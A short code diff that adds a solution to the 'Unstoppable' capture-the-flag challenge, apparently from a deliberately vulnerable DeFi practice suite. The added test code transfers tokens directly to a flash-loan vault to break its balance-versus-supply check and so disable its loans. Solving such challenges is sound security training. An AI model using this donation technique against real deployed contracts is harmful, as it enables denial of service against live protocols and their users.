@@ -45,6 +45,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        //Sending tokens directly to the vault address will cause an imbalance between total supply and balance before flash loan 
+        await token.connect(player).transfer(vault.address, 10)
     });
 
     after(async function () {
